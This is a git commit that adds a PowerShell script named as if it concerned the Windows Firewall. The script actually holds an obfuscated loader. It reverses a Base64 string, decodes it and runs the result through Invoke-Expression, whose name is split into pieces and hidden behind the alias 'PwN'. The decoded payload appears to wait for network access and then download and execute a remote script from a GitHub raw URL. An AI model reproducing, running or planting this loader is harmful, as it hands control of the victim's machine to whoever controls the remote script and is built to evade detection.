6452fc2ff2b66243c6235f2f27e48c7b9265cc3d
cyberforce49 <justhackedon2@gmail.com>
2025-04-26 16:21:11 +0500

    Add files via upload

---
+++ ReverseB64_Windows_Firewall.ps1
@@ -0,0 +1,4 @@
+$BeSt64CoDe = "=oQDpcSMzBnL4Fmcv4Wah12LzRWYlh2LzZWZy9ydhJ3Lz9SO0U2Yy9mZyVmY5N2Lt92YuIWdoRXan9yL6MHc0RHangyZulmc0NFZh9Gbud3bE5SK05WZpx2QiV2VuQXZOBCdjVmai9UL3VmToACWFlEI70XNgAXZlx2UtQnchR3U7BSKpQXZpVXUtASMgQnb192QtASbvNmLlx2Zv92Zuc3d3BibvlGdjVmbu92QtQ3clRFKgQ3bu1CKgUGbph2d" ;
+$BaSe64 = $BeSt64CoDe.ToCharArray() ; [array]::Reverse($BaSe64) ; $BaSe64 = -join $BaSe64 ;
+$LoAdCoDe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($BaSe64)) ;
+$PwN = "In"+"VoKe"+"-"+"ExPrEsSiOn" ; New-Alias -Name PwN -Value $PwN -Force ; PwN $LoAdCoDe ;
